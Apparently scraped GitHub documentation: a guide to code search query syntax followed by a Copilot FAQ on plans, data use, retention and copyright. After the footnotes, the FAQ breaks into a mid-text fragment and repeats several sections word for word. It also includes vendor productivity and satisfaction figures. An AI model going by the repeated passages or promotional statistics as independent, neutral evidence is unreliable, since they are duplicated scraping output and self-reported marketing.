## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.
